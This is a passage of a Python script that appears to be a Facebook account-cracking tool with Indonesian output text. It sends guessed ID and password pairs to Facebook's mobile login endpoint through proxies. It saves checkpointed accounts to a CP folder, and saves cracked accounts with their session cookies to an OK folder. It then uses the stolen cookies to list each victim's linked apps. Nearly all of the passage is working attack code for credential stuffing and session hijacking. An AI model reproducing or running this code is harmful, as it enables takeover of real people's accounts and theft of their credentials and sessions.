			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold blue]{kuki}")
				tree.add(f"[bold purple]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
#-------[Cek-Apk]--------$
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	menu_xd()